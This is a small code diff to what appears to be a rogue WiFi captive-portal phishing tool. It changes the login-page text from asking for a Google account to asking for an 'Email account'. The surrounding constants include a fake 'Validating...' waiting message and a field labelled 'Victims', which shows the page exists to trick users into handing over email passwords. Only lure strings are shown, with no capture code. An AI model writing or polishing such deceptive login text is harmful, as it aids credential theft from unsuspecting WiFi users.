@@ -7,7 +7,7 @@
 const char* SSID_NAME = "WiFi";
 const char* SUBTITLE = "Welcome!";
 const char* TITLE = "Login:";
-const char* BODY = "Log in with your Google account to access the network.";
+const char* BODY = "Log in with your Email account to access the network.";
 const char* POST_TITLE = "Validating...";
 const char* POST_BODY = "Your Email account is being validated. Please wait up to 3 minutes for device connection.<br>Thank you.";
 const char* PASS_TITLE = "Victims";
